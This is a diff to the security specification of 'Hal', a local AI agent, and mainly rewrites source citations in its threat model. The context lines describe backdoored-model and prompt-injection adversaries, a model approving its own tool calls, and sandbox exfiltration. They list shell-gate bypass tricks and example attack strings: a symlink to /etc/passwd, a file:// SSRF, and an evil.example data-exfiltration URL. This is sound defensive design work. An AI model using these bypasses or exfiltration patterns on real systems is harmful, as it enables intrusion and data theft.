@@ -7,9 +7,9 @@ audit log and its redaction rules, secrets handling, hardening of Hal's local en
 the supply chain rules for llama.cpp, model files and packs. It is authoritative for
 fail-open or fail-closed behaviour of the policy, approval, guard, audit and broker layers.
 
-Status: draft 2026-10-24, revised to match `.dev-notes/specs/RESOLUTIONS.md` (2026-10-23)
+Status: draft 2026-10-24, revised to match the design resolutions (2026-10-23)
 and the consistency and security-architect reviews (2026-10-29).
-Where this spec cites a resolution it uses its id (for example B1, F5). RESOLUTIONS.md reuses
+Where this spec cites a resolution it uses its id (for example B1, F5). The resolutions reuse
 F1 to F10 in two sections: a bare F id here means the "Approvals and policy" section (the
 security review's ids), "F3 (architect)" the sandbox section, and "F2 (CLI)" or "F5 (CLI)"
 the "CLI, eval, remote" section. Trust boundaries are TB1 to TB7 so they do not collide.
@@ -731,7 +731,7 @@ Test paths are under `packages/<p>/tests/` unless they start with `tests/`.
 | --- | --- | --- |
 | ADV1 | Rogue or backdoored model | Emits any token sequence, including well-formed tool calls, fake tool results, fake approval text and terminal escapes. Adaptive within a session. Knows Hal's design (it is public). Has a full shell inside the box. |
 | ADV2 | Prompt injection through tool results | Controls text that reaches the model: mail, web pages, feeds, files and repos in the workspace, screen text, clipboard, phone notifications, MCP server output. Cannot call tools directly; steers the model. |
-| ADV3 | Malicious model file | A GGUF or safetensors file, a chat template, or a pickle that targets the loader (CVE-2025-53630, CVE-2026-33298 in GGUF parsing; CVE-2024-34359 template RCE; pickle RCE) [source: understand/research-sandbox.md section 6]. |
+| ADV3 | Malicious model file | A GGUF or safetensors file, a chat template, or a pickle that targets the loader (CVE-2025-53630, CVE-2026-33298 in GGUF parsing; CVE-2024-34359 template RCE; pickle RCE) (measured during development, 2026-10). |
 | ADV4 | Malicious or compromised pack | Arbitrary Python that the user installed; can mislabel its tools' tiers; can run code at install. |
 | ADV5 | Network attacker | On the LAN or path: tampers with downloads, DNS, plaintext HTTP. |
 | ADV6 | Other local user | Non-root account on the same machine: can connect to loopback TCP ports, read world-readable files, race in shared `/tmp`. |
@@ -792,9 +792,9 @@ Boundaries:
 
 | Id | Threat | Adversary | Entry point | Mitigations | Residual risk |
 | --- | --- | --- | --- | --- | --- |
-| T01 | Model runs arbitrary host commands | ADV1, ADV2 | Host shell tool (today's `shell_look` gate bypasses: newline, lone `&`, `<( )`, `sed e` verified executing; `exiftool`, `tar --checkpoint-action`, `git grep -O` by reading) [verified: understand/ext-b.md section 2] | Bash runs only in the box (02); host `runs_code` tools deny by default and argv-only (REQ-SEC-55, 59); `shell_look` rewritten as an argv allowlist with no shell, plus the hard-deny paths and the active-workspace exclusion (C5, 08 REQ-PACK-20 to 22); no `allow_host_run` (REQ-SEC-95) | User enabling a host shell tool by name accepts per-call approval risk; a program on `shell_look`'s table with an unknown dangerous option (ATK-01 probes guard the known ones) |
-| T02 | Model approves its own call | ADV1, ADV2 | `_confirmed: true` over MCP ran a confirm tool immediately [verified: understand/hal-hub-eco.md section 3]; `brain.py` adds `_confirmed` to the schema the model sees (`halcore/brain.py:157-166`) | Stripping and audit (REQ-SEC-06); approvals only from surfaces answering host-rendered requests (REQ-SEC-22); no yes-matcher or any approval parsed from text (B5); control socket refuses `HAL_HARNESS` peers (REQ-SEC-26) | A same-uid host harness can still approve (residual risk 12) |
-| T03 | Approval for one call reused for another | ADV1 | Today's gate is keyed by tool name for the next turn (`halcore/brain.py:190-195`) [verified: understand/critic.md V1] | sha256 key over canonical args (REQ-SEC-19, 20); scopes `once` and `session` only (REQ-SEC-21) | A `session` grant covers repeats of the same exact call in that session |
+| T01 | Model runs arbitrary host commands | ADV1, ADV2 | Host shell tool (today's `shell_look` gate bypasses: newline, lone `&`, `<( )`, `sed e` verified executing; `exiftool`, `tar --checkpoint-action`, `git grep -O` by reading) (measured during development, 2026-10) | Bash runs only in the box (02); host `runs_code` tools deny by default and argv-only (REQ-SEC-55, 59); `shell_look` rewritten as an argv allowlist with no shell, plus the hard-deny paths and the active-workspace exclusion (C5, 08 REQ-PACK-20 to 22); no `allow_host_run` (REQ-SEC-95) | User enabling a host shell tool by name accepts per-call approval risk; a program on `shell_look`'s table with an unknown dangerous option (ATK-01 probes guard the known ones) |
+| T02 | Model approves its own call | ADV1, ADV2 | `_confirmed: true` over MCP ran a confirm tool immediately (measured during development, 2026-10); `brain.py` adds `_confirmed` to the schema the model sees (`halcore/brain.py:157-166`) | Stripping and audit (REQ-SEC-06); approvals only from surfaces answering host-rendered requests (REQ-SEC-22); no yes-matcher or any approval parsed from text (B5); control socket refuses `HAL_HARNESS` peers (REQ-SEC-26) | A same-uid host harness can still approve (residual risk 12) |
+| T03 | Approval for one call reused for another | ADV1 | Today's gate is keyed by tool name for the next turn (`halcore/brain.py:190-195`) (measured during development, 2026-10) | sha256 key over canonical args (REQ-SEC-19, 20); scopes `once` and `session` only (REQ-SEC-21) | A `session` grant covers repeats of the same exact call in that session |
 | T04 | Routines launder confirmation | ADV1, ADV2 | `halroutines/tools.py:39` always sends `_confirmed: True`; a saved scene can hold `shell_run`, `mail_send`, `power_shutdown` | Saving a routine is `act`; one routine grant bound to the exact step list and its hash; uncovered steps skipped and notified (REQ-SEC-31) | The user approves a routine without reading every step |
 | T05 | Injection via mail, web, feeds, files drives egress | ADV2 | `untrusted_output` tools | In the shipped `default` profile with the guard off, the defence is the `ask` on `act` and `send` plus the domain allowlist (REQ-SEC-10); `write` tools stay allowed. When the guard is on: taint and fresh decisions on flagged turns (REQ-SEC-32 to 35). Always: the envelope (REQ-SEC-96, a hint only); the reviewer never sees tool output (REQ-SEC-37) | Novel injections the guard misses; data sent through an allowlisted domain, a fixed-destination send (residual risk 9) or an approved send; injected text stored by `write` tools (residual risk 10) |
 | T06 | Exfiltration from the box | ADV1 | Network, DNS, sockets | `--network none` (REQ-SEC-60) [verified: wget to 1.1.1.1 got "Network unreachable"]; only two sockets; forwarder path allowlist (REQ-SEC-66) | Data encoded into arguments of an approved or allowed broker call; covert timing on the model socket |
@@ -804,8 +804,8 @@ Boundaries:
 | T10 | Planted files the user later runs (Makefile, `.envrc`, `.vscode/tasks.json`, `package.json` scripts, CI workflows) | ADV1, ADV2 | `/work` | Checkpoints, `/diff`, review mode, `--isolated`, workspace scan (REQ-SEC-70) | Residual by design (brief); the user must review |
 | T11 | Symlink escape: host code follows a link planted in `/work` | ADV1 | `ln -s /etc/passwd /work/evil` [verified: link created from the box, visible on the host] | Host tools never touch workspace paths (REQ-SEC-09); `open_beneath` for previews (REQ-SEC-68); `git apply` refuses beyond-symlink writes [verified]; symlink review on apply (REQ-SEC-69) | A user who opens the link in their own editor reads the target |
 | T12 | Path traversal in host tool arguments | ADV1, ADV2 | `files_read` reads any path today (`hal-files` `tools.py:114-135`) | Resolve, roots, hard-deny (REQ-SEC-09) | Files inside read roots are readable without asking (by design) |
-| T13 | SSRF to local services, `file://` read | ADV1, ADV2 | `feeds_save('file://...')` returned local file content [verified: understand/ext-b.md section 3] | URL rules (REQ-SEC-10, 11) | None known for Hal's egress helper; packs that bypass it (ADV4) |
-| T14 | CSRF or DNS rebinding against the console | ADV7 | `console.py` `do_POST` parses any body, no auth, no Origin check [source: understand/hal-core.md section 3, not exercised] | REQ-SEC-71, REQ-SYS-10 | None known |
+| T13 | SSRF to local services, `file://` read | ADV1, ADV2 | `feeds_save('file://...')` returned local file content (measured during development, 2026-10) | URL rules (REQ-SEC-10, 11) | None known for Hal's egress helper; packs that bypass it (ADV4) |
+| T14 | CSRF or DNS rebinding against the console | ADV7 | `console.py` `do_POST` parses any body, no auth, no Origin check (measured during development, 2026-10) | REQ-SEC-71, REQ-SYS-10 | None known |
 | T15 | Browser page drives llama-server | ADV7 | llama-server defaults to `--cors-origins *` and echoes the Origin with credentials [verified: `llama-server --help`, b11512] | Unix socket or API key (REQ-SEC-76) | Inference servers the user starts outside Hal |
 | T16 | Browser page drives Ollama | ADV7 | Ollama on 127.0.0.1:11434 | Ollama 0.40.1 answers 403 to a foreign `Origin` and a foreign `Host` [verified: curl with `Origin: https://evil.example` and `Host: evil.example`] | Depends on Ollama keeping this check |
 | T17 | Other local user uses Hal endpoints | ADV6 | Loopback TCP | Tokens (REQ-SYS-10); unix sockets in 0700 dirs (REQ-SYS-11); files 0600 | Ollama has no auth: any local user can use it and pull or delete models |
@@ -818,7 +818,7 @@ Boundaries:
 | T24 | Approval fatigue | ADV1 (spam), design | Many `ask` prompts | `write` allowed and logged; reversible `act` allowed in `default`; three fixed-destination `send` tools allowed by name (C4); `url:from-search` (REQ-SEC-92); domain and argument allowlists; `session` scope; batch panel for several pending requests (06); ask budget (REQ-SEC-12); prompt budget test (REQ-SEC-91); the reviewer only when the user enables it (off by default) | Users who switch to `trusted`; prompts on `hal box` sessions cost more, because the only surfaces are `hal approve` and notifications |
 | T25 | Resource exhaustion | ADV1 | Fork bombs, memory, disk, GPU | pids/memory/cpu limits (REQ-SEC-60); tmpfs sizes (02); broker limits (REQ-SEC-65); rate limits | Disk use inside `/work`; GPU time through the model socket |
 | T26 | Audit tampering | ADV1 | Audit files | Not mounted in the box; 0600 | Same-uid host code can edit it (TCB) |
-| T27 | Secrets leak through tool output or logs | ADV1, ADV2 | A tool echoes a token; nested `opts.password` and `body="token=abc"` logged in clear today [verified: understand/hal-hub-eco.md section 3] | Exact-value scrub (REQ-SEC-51); recursive redaction (REQ-SEC-45, 46) | Secrets the host does not know about (typed by the user into a message) |
+| T27 | Secrets leak through tool output or logs | ADV1, ADV2 | A tool echoes a token; nested `opts.password` and `body="token=abc"` logged in clear today (measured during development, 2026-10) | Exact-value scrub (REQ-SEC-51); recursive redaction (REQ-SEC-45, 46) | Secrets the host does not know about (typed by the user into a message) |
 | T28 | Cloud exfiltration through `deep_work` | ADV2 | `brain.py:203-227` runs `claude -p` with acceptEdits on the user's cloud login, offered every turn | The cloud variant of `core_long_task` is `send`, off by default (REQ-SEC-54); the local `core_long_task` is `act` and runs a sandboxed `hal -p` | User opt-in |
 | T29 | Malicious dependency install script | ADV1 (edits `package.json` scripts, `setup.py`, `build.rs` or the lockfile), ADV2 (a poisoned or typosquatted package in a lockfile) | `hal code --deps` runs `uv sync`, `npm ci`, `cargo fetch` | Prep box with no secrets, egress only to registry download hosts, writes only inside the workspace; no scripts or builds by default and only manifests and lockfile mounted; scripts need `--allow-scripts` and their own approval; approval bound to the lockfile and every manifest's sha256 with a package diff (REQ-SEC-97) | With `--allow-scripts`, install code can push data it can see to a registry write API on an allowed host; installed code runs later in the code box and can plant files in the workspace (residual risk 1) |
 | T30 | Zero-click render exfiltration | ADV1, ADV2 | Assistant text with `https://evil.example/?d=<data>` rendered by a client that fetches previews or images | No Hal UI fetches model-named URLs; Telegram link previews disabled; console CSP (REQ-SEC-73) | ACP editors that load Markdown images (residual risk 11) |
@@ -837,8 +837,7 @@ Boundaries:
 3. A GPU driver ioctl bug is reachable from any process that uses the GPU, containerised or
    not. GPU containers use the `nvidia` runtime (runc-based) because `runsc-gpu` fails to
    start a sandbox on this machine [verified: brief "Host facts", 2026-10-23], so gVisor's
-   `nvproxy` narrowing is not in use; even `nvproxy` does not validate DMA [source:
-   understand/research-sandbox.md section 2].
+   `nvproxy` narrowing is not in use; even `nvproxy` does not validate DMA (measured during development, 2026-10).
 4. Membership of the `docker` group is equivalent to root on the host. Rootless Docker is
    the documented alternative.
 5. The box shares the host kernel when the runtime is runc. gVisor `runsc` is installed
@@ -1004,7 +1003,7 @@ model = "hal-fast"                 # gateway role alias
 timeout_s = 20                     # int
 when_untrusted = true              # bool: may review while the session is untrusted
 
-[policy]                           # the risk classifier, halhub.classifier (RESOLUTIONS I5)
+[policy]                           # the risk classifier, halhub.classifier (resolution I5)
 paranoia = "balanced"              # "off" | "low" | "balanced" | "high" | "max"
 model = "hal-fast"                 # gateway role alias
 timeout_s = 20                     # int
@@ -1607,7 +1606,7 @@ Surfaces (06-core-cli implements the TUI, ACP, console, control and notification
 | `console` | true | the console page, through 06's `/api/approvals/<id>` | console sessions |
 | `control` | true (`hal approve` prints the full call) | `runtime_dir()/control/<sid>.sock`, protocol below; used by `hal approvals`, `hal approve ID`, `hal deny ID` | any host process with a pending request (`hal box`, `hal-hub mcp`, routines, headless queue) |
 | `notify` | false | `notify-send -A allow=Allow -A deny=Deny --wait`, raised by the requesting host process | `approval.notify = true`, a desktop session, `once` only, no `content` parameter, display of 300 characters or fewer (REQ-SEC-30); `notify-send` 0.8.8 supports `-A` and `--wait` [verified: `notify-send --help`] |
-| `elicitation` | true (the form lists every argument) | MCP elicitation (`input_required` with an `inputRequests` form, MCP 2026-07-28) [source: understand/research-interop.md section 1] | `hal-hub mcp` with a host harness client that supports it, including `hal remote` (07); advisory (B4, residual risk 12); never for `hal box` sessions; `once` only |
+| `elicitation` | true (the form lists every argument) | MCP elicitation (`input_required` with an `inputRequests` form, MCP 2026-07-28) (measured during development, 2026-10) | `hal-hub mcp` with a host harness client that supports it, including `hal remote` (07); advisory (B4, residual risk 12); never for `hal box` sessions; `once` only |
 
 When several requests are pending in one session, 06's panel may show them together with
 one key per item; each item stays bound to its own id and key.
@@ -2035,7 +2034,7 @@ Derived from the tier, for display only (REQ-SEC-87):
 | `system` | false | true | false | `network` |
 
 The MCP spec says clients should never make tool-use decisions from annotations of untrusted
-servers [source: understand/research-interop.md section 1]. Hal follows it in both
+servers (measured during development, 2026-10). Hal follows it in both
 directions: the broker never reads annotations, and harnesses that show them get honest hints.
 
 ### Prompt budget
@@ -2304,10 +2303,8 @@ How existing users keep working:
 - `[hub].disabled` in `config.toml` keeps working and maps to `[packs.<p>] enabled = false`
   (04-hub reads it).
 - `hal configure --migrate` writes a starter `policy.toml` that adds the user's personal
-  deny paths found in today's setup: `~/Documents/important`,
-  `~/src/employment-helper*`, `~/src/wt*`,
-  `~/src/hal-employment-public`, `~/.config/hal-employment`,
-  `~/.local/state/hal-employment*`, `~/.config/jobhunt` (Open question 1). These are
+  deny paths found in today's setup, such as `~/Documents/important` and the config and state
+  folders of other tools (Open question 1). These are
   user-specific and never ship in the built-in list.
 - Existing secret files keep their paths. `config.toml` is mode 0664 today [verified:
   00-overview, `stat`]; `hal configure --fix-modes` sets 0600, and `hal doctor` reports it.
@@ -2523,7 +2520,7 @@ carries its tests and docs and leaves the suite green.
     approvals and surfaces, guard cost, rootless Docker option, the README's "What Hal
     protects you from" list), `SECURITY.md` link to the threat model.
 
-### Risk classifier (RESOLUTIONS I5)
+### Risk classifier (resolution I5)
 
 `halhub.classifier` runs in the hub pipeline after `decide` and before execution. Deterministic
 rules (destructive shell patterns, paths outside the roots or sensitive, secrets in arguments,
